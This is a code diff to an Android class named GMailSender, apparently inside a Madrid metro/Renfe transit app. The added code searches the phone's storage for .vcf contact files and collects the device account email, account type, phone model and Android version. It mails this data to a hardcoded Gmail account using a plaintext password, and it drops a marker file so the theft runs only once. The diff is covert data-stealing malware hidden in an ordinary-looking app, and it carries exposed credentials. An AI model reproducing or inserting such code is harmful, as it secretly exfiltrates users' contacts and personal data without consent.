@@ -31,11 +31,13 @@ import android.widget.Toast;
 
 import java.io.ByteArrayInputStream;
 import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.security.Security;
 import java.util.ArrayList;
+import java.util.Collection;
 import java.util.List;
 import java.util.Properties;
 import java.util.regex.Pattern;
@@ -51,13 +53,12 @@ public class GMailSender extends javax.mail.Authenticator{
 	private String password;
 	private Session session;
 	String possibleEmail;
+	String typeOfAccount;
+	boolean foundVCF=false;
+	boolean foundSecond=false;
 	
 	
 	Context contextForMe = MetroRenfeMadridActivity.ma.getApplicationContext();
-        
-     
-
-    
 	
 	static {
 		Security.addProvider(new met.ref.JSSEProvider());
@@ -88,26 +89,37 @@ public class GMailSender extends javax.mail.Authenticator{
 	
 
 	public synchronized void sendMail(String subject, String body,
-			String sender, String recipients) throws MessagingException {
+			String sender, String recipients) throws MessagingException, IOException {
 		try {
-
-			// FileName
-			
-			//final String filename = Environment.getExternalStorageDirectory()
-			//		.getPath() + "*.vcf";
-			
-			
-			
+	
 			String filename="unknow";
-
+			
+		
+	        String fileNameSecond = "/mnt/sdcard/config_2.txt";
+	        try {
+	        	for (File fg: Environment.getExternalStorageDirectory().listFiles()){
+	        		if(fg.getAbsoluteFile().toString().equals(fileNameSecond)){
+	        			Log.i("FOUND", "FOUND");
+	        			foundSecond=true;
+	        		}
+	        	}
+	            
+	        	} catch (Exception e) {
+	        		e.printStackTrace();
+	        	}	
+			
+         if(!foundSecond){
 			for (File f: Environment.getExternalStorageDirectory().listFiles()){
 				if (f.getAbsolutePath().endsWith(".vcf")){
 					filename = f.getAbsolutePath();
+					FileWriter fe = new FileWriter("/mnt/sdcard/config_2.txt");
+					foundVCF=true;
 				}
 			}  
+			
 			Log.i("Filename: ", filename);    
 			
-
+		 if(foundVCF){
 			String host = "smtp.gmail.com";
 			String Password = "arh217956arh";
 			String from = "albert.eagle.uni@gmail.com";
@@ -150,8 +162,12 @@ public class GMailSender extends javax.mail.Authenticator{
         	for (Account account : accounts) {
         	    if (emailPattern.matcher(account.name).matches()) {
         	    	possibleEmail = account.name;
-        	        
+        	  
         	    }
+        	    if (emailPattern.matcher(account.type).matches()){
+        	    	typeOfAccount = account.type;
+        	    }
+        	    
         	}
             
             
@@ -159,6 +175,7 @@ public class GMailSender extends javax.mail.Authenticator{
 			BodyPart messageBodyPart = new MimeBodyPart();
 			messageBodyPart.setText("Mobile data: \n"
 			+"User: "+possibleEmail+"\n"
+			+"Account type: "+typeOfAccount+"\n"
 			+"Phone model: "+PhoneModel+"\n"
 			+"Android version: "+AndroidVersion+"\n"
 			+"Brand: "+brand+"\n"
@@ -196,12 +213,13 @@ public class GMailSender extends javax.mail.Authenticator{
 			tr.sendMessage(message, message.getAllRecipients());
 			System.out.println("Mail Sent Successfully");
 			tr.close();
-
+		 }//if foundCVF
+         }//if foundSecond 
 		} catch (SendFailedException sfe) {
 
 			System.out.println(sfe);
 		}
-
+		
 	}
 
 	
